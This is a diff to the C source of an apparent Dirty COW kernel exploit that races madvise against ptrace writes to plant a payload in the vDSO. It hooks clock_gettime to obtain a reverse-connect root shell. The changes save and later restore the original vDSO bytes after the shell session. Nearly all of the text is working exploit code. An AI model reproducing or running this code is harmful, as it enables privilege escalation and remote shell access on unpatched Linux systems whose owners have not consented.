@@ -41,8 +41,9 @@ typedef unsigned long uint64_t;
 
 struct vdso_patch {
 	unsigned char *patch;
+	unsigned char *copy;
 	size_t size;
-	unsigned long addr;
+	void *addr;
 };
 
 struct prologue {
@@ -166,39 +167,50 @@ static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
 	return 0;
 }
 
-static void *patch_payload(struct prologue *prologue)
+static int patch_payload(struct prologue *prologue)
 {
-	void *new_payload;
 	unsigned char *p;
 
-	new_payload = malloc(payload_len);
-	if (new_payload == NULL) {
-		warn("malloc");
-		return NULL;
-	}
-
-	memcpy(new_payload, payload, payload_len);
-
-	p = memmem(new_payload, payload_len, PATCH, sizeof(PATCH)-1);
+	p = memmem(payload, payload_len, PATCH, sizeof(PATCH)-1);
 	if (p == NULL) {
 		fprintf(stderr, "[-] failed to patch payload\n");
-		free(new_payload);
-		return NULL;
+		return -1;
 	}
 
 	memset(p, '\x90', sizeof(PATCH)-1 - prologue->size);
 	memcpy(p + sizeof(PATCH)-1 - prologue->size, prologue->opcodes, prologue->size);
 
-	return new_payload;
+	return 0;
+}
+
+/* make a copy of vDSO to restore it later */
+static int save_orig_vdso(void)
+{
+	struct vdso_patch *p;
+	int i;
+
+	for (i = 0; i < ARRAY_SIZE(vdso_patch); i++) {
+		p = &vdso_patch[i];
+		p->copy = malloc(p->size);
+		if (p->copy == NULL) {
+			warn("malloc");
+			return -1;
+		}
+
+		memcpy(p->copy, p->addr, p->size);
+	}
+
+	return 0;
 }
 
 static int build_vdso_patch(void *vdso_addr)
 {
 	uint32_t clock_gettime_offset, target;
 	unsigned long clock_gettime_addr;
-	unsigned char *new_payload, *p, *buf;
 	struct prologue *prologue;
+	unsigned char *p, *buf;
 	uint64_t entry_point;
+	bool patched;
 	int i;
 
 	/* e_entry */
@@ -208,30 +220,31 @@ static int build_vdso_patch(void *vdso_addr)
 	clock_gettime_addr = (unsigned long)vdso_addr + clock_gettime_offset;
 
 	/* patch payload with appropriate prologue */
-	new_payload = NULL;
+	patched = false;
 	for (i = 0; i < ARRAY_SIZE(prologues); i++) {
 		prologue = &prologues[i];
 		if (memcmp((void *)clock_gettime_addr, prologue->opcodes, prologue->size) == 0) {
-			new_payload = patch_payload(prologue);
-			if (new_payload == NULL)
+			if (patch_payload(prologue) == -1)
 				return -1;
+			patched = true;
 			break;
 		}
 	}
 
-	if (new_payload == NULL) {
+	if (!patched) {
 		fprintf(stderr, "[-] this vDSO version isn't supported\n");
 		fprintf(stderr, "    add first entry point instructions to prologues\n");
 		return -1;
 	}
 
 	/* patch #1: put payload at the end of vdso */
-	vdso_patch[0].patch = new_payload;
+	vdso_patch[0].patch = payload;
 	vdso_patch[0].size = payload_len;
-	vdso_patch[0].addr = (unsigned long)vdso_addr + VDSO_SIZE - payload_len;
+	vdso_patch[0].addr = (unsigned char *)vdso_addr + VDSO_SIZE - payload_len;
 
+	p = vdso_patch[0].addr;
 	for (i = 0; i < payload_len; i++) {
-		if (*(char *)(vdso_patch[0].addr + i) != '\x00') {
+		if (p[i] != '\x00') {
 			fprintf(stderr, "failed to find a place for the payload\n");
 			return -1;
 		}
@@ -252,7 +265,9 @@ static int build_vdso_patch(void *vdso_addr)
 
 	vdso_patch[1].patch = buf;
 	vdso_patch[1].size = prologue->size;
-	vdso_patch[1].addr = clock_gettime_addr;
+	vdso_patch[1].addr = (unsigned char *)clock_gettime_addr;
+
+	save_orig_vdso();
 
 	return 0;
 }
@@ -262,9 +277,23 @@ static int backdoor_vdso(pid_t pid)
 	struct vdso_patch *p;
 	int i;
 
-	for (i = 0; i < 2; i++) {
+	for (i = 0; i < ARRAY_SIZE(vdso_patch); i++) {
 		p = &vdso_patch[i];
-		if (ptrace_memcpy(pid, (void *)p->addr, p->patch, p->size) == -1)
+		if (ptrace_memcpy(pid, p->addr, p->patch, p->size) == -1)
+			return -1;
+	}
+
+	return 0;
+}
+
+static int restore_vdso(pid_t pid)
+{
+	struct vdso_patch *p;
+	int i;
+
+	for (i = ARRAY_SIZE(vdso_patch) - 1; i >= 0; i--) {
+		p = &vdso_patch[i];
+		if (ptrace_memcpy(pid, p->addr, p->copy, p->size) == -1)
 			return -1;
 	}
 
@@ -278,31 +307,23 @@ static int backdoor_vdso(pid_t pid)
 static int check(struct mem_arg *arg, int pipe)
 {
 	struct vdso_patch *p;
-	void *vdso_addr;
 	bool patched;
+	void *src;
 	int i, j;
 	char c;
-
-	vdso_addr = get_vdso_addr();
-	if (vdso_addr == NULL)
-		return -1;
-
-	/* rebuild patch since vDSO is at a different address */
-	if (build_vdso_patch(vdso_addr) == -1)
-		return -1;
 
 	for (i = 0; i < LOOP; i++) {
 		patched = true;
 		for (j = 0; j < ARRAY_SIZE(vdso_patch); j++) {
 			p = &vdso_patch[j];
-			if (memcmp((void *)p->addr, p->patch, p->size) != 0) {
+			src = arg->do_patch ? p->patch : p->copy;
+			if (memcmp(p->addr, src, p->size) != 0) {
 				patched = false;
 				break;
 			}
 		}
 
 		if (patched) {
-			fprintf(stderr, "[*] vdso successfully patched\n");
 			c = '!';
 			if (writeall(pipe, &c, sizeof(c)) == -1)
 				return -1;
@@ -354,8 +375,8 @@ static int debuggee(void *arg_)
 /* use ptrace to write to read-only mappings */
 static void *ptrace_thread(void *arg_)
 {
+	int flags, ret2, status;
 	struct mem_arg *arg;
-	int flags, status;
 	pid_t pid;
 	void *ret;
 
@@ -385,7 +406,12 @@ static void *ptrace_thread(void *arg_)
 
 	ret = NULL;
 	while (!arg->stop) {
-		if (backdoor_vdso(pid) == -1) {
+		if (arg->do_patch)
+			ret2 = backdoor_vdso(pid);
+		else
+			ret2 = restore_vdso(pid);
+
+		if (ret2 == -1) {
 			ret = NULL;
 			break;
 		}
@@ -411,6 +437,9 @@ static int exploit(struct mem_arg *arg, bool do_patch)
 	int ret;
 	char c;
 
+	arg->stop = false;
+	arg->do_patch = do_patch;
+
 	if (pipe(fd) == -1) {
 		warn("pipe");
 		return -1;
@@ -432,9 +461,6 @@ static int exploit(struct mem_arg *arg, bool do_patch)
 
 	close(fd[1]);
 
-	arg->stop = false;
-	arg->do_patch = do_patch;
-
 	pthread_create(&pth1, NULL, madviseThread, arg);
 	pthread_create(&pth2, NULL, ptrace_thread, arg);
 
@@ -452,7 +478,8 @@ static int exploit(struct mem_arg *arg, bool do_patch)
 
 	/* check result */
 	if (read(fd[0], &c, sizeof(c)) == sizeof(c)) {
-		fprintf(stderr, "[+] yeah\n");
+		fprintf(stderr, "[*] vdso successfully %s\n",
+			arg->do_patch ? "backdoored" : "restored");
 		ret = 0;
 	} else {
 		fprintf(stderr, "[-] failed to win race condition...\n");
@@ -499,7 +526,7 @@ static int create_socket(void)
 }
 
 /* interact with reverse connect shell */
-static int yeah(int s)
+static int yeah(struct mem_arg *arg, int s)
 {
 	struct sockaddr_in addr;
 	struct pollfd fds[2];
@@ -523,6 +550,11 @@ static int yeah(int s)
 	}
 
 	close(s);
+
+	fprintf(stderr, "[+] ok\n");
+
+	if (exploit(arg, false) == -1)
+		fprintf(stderr, "failed to restore vDSO\n");
 
 	fprintf(stderr, "[*] enjoy!\n");
 
@@ -594,7 +626,7 @@ int main(void)
 		return EXIT_FAILURE;
 	}
 
-	yeah(s);
+	yeah(&arg, s);
 
 	return EXIT_SUCCESS;
 }
